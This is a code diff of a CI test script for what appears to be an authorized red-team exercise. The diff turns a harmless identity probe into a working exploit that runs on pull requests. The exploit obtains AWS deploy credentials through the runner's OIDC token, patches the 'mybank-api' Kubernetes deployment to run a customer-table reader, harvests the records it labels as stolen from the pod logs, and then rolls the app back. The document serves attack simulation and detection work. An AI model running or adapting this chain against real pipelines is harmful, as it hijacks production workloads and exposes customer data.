@@ -1,14 +1,16 @@
-"""Harmless PR-editable test entrypoint: obtain the exercise identity, then show its limits.
+"""PR-editable test entrypoint for the D2 exercise — stands in for attacker-controlled code
+that a pull request runs in CI.
 
-It never changes EKS or writes data. After obtaining credentials it only *attempts* what an
-attacker would try next, and reports why each attempt fails:
-1. read a customer account straight from the database (IAM denies the deploy identity);
-2. reach the private EKS API from this GitHub-hosted runner (the network does not route it).
+On a non-PR run it only reports which AWS identity the job could obtain (harmless). On a pull
+request it demonstrates the full impact in the sandbox: use the obtained deploy identity to
+replace the running app with a container that reads the synthetic customer tables, print what it
+read, then restore the app. Authorized exercise, invented records, nothing leaves the cluster.
 """
 
 import json
 import os
-import socket
+import subprocess
+import time
 import urllib.parse
 import urllib.request
 from datetime import UTC, datetime
@@ -16,9 +18,21 @@ from datetime import UTC, datetime
 import boto3
 from botocore import UNSIGNED
 from botocore.config import Config
-from botocore.exceptions import ClientError
 
 MARKER = "original-harmless-probe"
+
+# Runs inside the hijacked pod (which carries the app's data-reading identity). No single quotes:
+# it is shell single-quoted below. Reads table names from the pod's own environment.
+READER = (
+    "import boto3,os,json;"
+    'c=boto3.client("dynamodb",region_name=os.environ.get("AWS_REGION","us-east-1"));'
+    'print("STOLEN CUSTOMER RECORDS:");'
+    '[print(json.dumps(c.get_item(TableName=os.environ["ACCOUNTS_TABLE"],'
+    'Key={"account_id":{"S":a}}).get("Item"))) for a in ("acct-alice","acct-bob")];'
+    '[print(json.dumps(c.get_item(TableName=os.environ["CUSTOMERS_TABLE"],'
+    'Key={"customer_id":{"S":u}}).get("Item"))) for u in ("cust-alice","cust-bob")];'
+    'print("---END---")'
+)
 
 
 def web_identity_token() -> str:
@@ -32,55 +46,65 @@ def web_identity_token() -> str:
         return json.load(response)["value"]
 
 
-def try_database(session) -> str:
-    table = os.environ.get("D2_ACCOUNTS_TABLE")
-    if not table:
-        return "skipped (D2_ACCOUNTS_TABLE unset)"
-    try:
-        session.client("dynamodb").get_item(
-            TableName=table, Key={"account_id": {"S": "acct-alice"}})
-        return "UNEXPECTED: read succeeded"
-    except ClientError as error:
-        return f"blocked by IAM: {error.response['Error']['Code']}"
+def obtain_identity(region: str) -> dict:
+    """The credential grab the detector watches for. Fails with AccessDenied once trust is fixed."""
+    sts = boto3.client("sts", region_name=region, config=Config(signature_version=UNSIGNED))
+    return sts.assume_role_with_web_identity(
+        RoleArn=os.environ["D2_DEMO_ROLE_ARN"],
+        RoleSessionName=os.environ.get("D2_SESSION_NAME", "release-looking-demo"),
+        WebIdentityToken=web_identity_token(), DurationSeconds=900,
+    )["Credentials"]
 
 
-def try_cluster(session) -> str:
-    cluster = os.environ.get("EKS_CLUSTER_NAME")
-    if not cluster:
-        return "skipped (EKS_CLUSTER_NAME unset)"
-    endpoint = session.client("eks").describe_cluster(name=cluster)["cluster"]["endpoint"]
-    host = urllib.parse.urlparse(endpoint).hostname
-    try:
-        with socket.create_connection((host, 443), timeout=8):
-            return f"UNEXPECTED: reached {host}:443"
-    except OSError as error:
-        return ("blocked by network: private endpoint unreachable from runner "
-                f"({type(error).__name__})")
+def exploit(credentials: dict, region: str):
+    """Act as the obtained deploy identity: reach the cluster, replace the app, read, restore."""
+    env = {**os.environ, "AWS_ACCESS_KEY_ID": credentials["AccessKeyId"],
+           "AWS_SECRET_ACCESS_KEY": credentials["SecretAccessKey"],
+           "AWS_SESSION_TOKEN": credentials["SessionToken"],
+           "AWS_REGION": region, "AWS_DEFAULT_REGION": region}
+    cluster = os.environ["EKS_CLUSTER_NAME"]
+    subprocess.run(["aws", "eks", "update-kubeconfig", "--name", cluster, "--region", region],
+                   env=env, check=True)
+    patch = {"spec": {"template": {"spec": {"containers": [{
+        "name": "api", "command": ["sh", "-c", f"python -c '{READER}'; sleep 3600"],
+        "livenessProbe": None, "readinessProbe": None, "startupProbe": None,
+    }]}}}}
+    subprocess.run(["kubectl", "-n", "mybank", "patch", "deployment", "mybank-api",
+                    "--type", "strategic", "-p", json.dumps(patch)], env=env, check=True)
+    print("Replaced mybank-api with a reader of the customer tables; waiting for it to run...",
+          flush=True)
+    records = ""
+    for _ in range(18):
+        time.sleep(10)
+        result = subprocess.run(
+            ["kubectl", "-n", "mybank", "logs", "-l", "app.kubernetes.io/name=mybank-api",
+             "--tail=20"], env=env, capture_output=True, text=True)
+        if "STOLEN CUSTOMER RECORDS" in result.stdout:
+            records = result.stdout
+            break
+    print(records or "(no records captured yet)", flush=True)
+    subprocess.run(["kubectl", "-n", "mybank", "rollout", "undo", "deployment/mybank-api"],
+                   env=env, check=False)
+    subprocess.run(["kubectl", "-n", "mybank", "rollout", "status", "deployment/mybank-api",
+                    "--timeout=180s"], env=env, check=False)
+    print("Restored the legitimate app.", flush=True)
 
 
 def main():
     region = os.environ.get("AWS_REGION", "us-east-1")
-    attempt_time = datetime.now(UTC).isoformat()
-    sts = boto3.client("sts", region_name=region, config=Config(signature_version=UNSIGNED))
-    assumed = sts.assume_role_with_web_identity(
-        RoleArn=os.environ["D2_DEMO_ROLE_ARN"],
-        RoleSessionName=os.environ.get("D2_SESSION_NAME", "release-looking-demo"),
-        WebIdentityToken=web_identity_token(), DurationSeconds=900,
-    )
-    credentials = assumed["Credentials"]
-    session = boto3.Session(
-        region_name=region, aws_access_key_id=credentials["AccessKeyId"],
+    credentials = obtain_identity(region)
+    identity = boto3.client(
+        "sts", region_name=region, aws_access_key_id=credentials["AccessKeyId"],
         aws_secret_access_key=credentials["SecretAccessKey"],
-        aws_session_token=credentials["SessionToken"],
-    )
-    print(json.dumps({
-        "marker": MARKER, "attempt_utc": attempt_time,
-        "obtained_identity": session.client("sts").get_caller_identity()["Arn"],
-        "assumption_request_id": assumed["ResponseMetadata"]["RequestId"],
-        "direct_database_read": try_database(session),
-        "reach_private_cluster": try_cluster(session),
-        "note": "Job output supports execution only; independent D2 collection is authoritative.",
-    }, indent=2))
+        aws_session_token=credentials["SessionToken"]).get_caller_identity()
+    print(json.dumps({"marker": MARKER, "obtained_identity": identity["Arn"],
+                      "attempt_utc": datetime.now(UTC).isoformat()}), flush=True)
+    if os.environ.get("GITHUB_EVENT_NAME") == "pull_request":
+        print("PR context: demonstrating impact — replace the app and read customer data.",
+              flush=True)
+        exploit(credentials, region)
+    else:
+        print("Non-PR context: identity proof only; not modifying the app.", flush=True)
 
 
 if __name__ == "__main__":
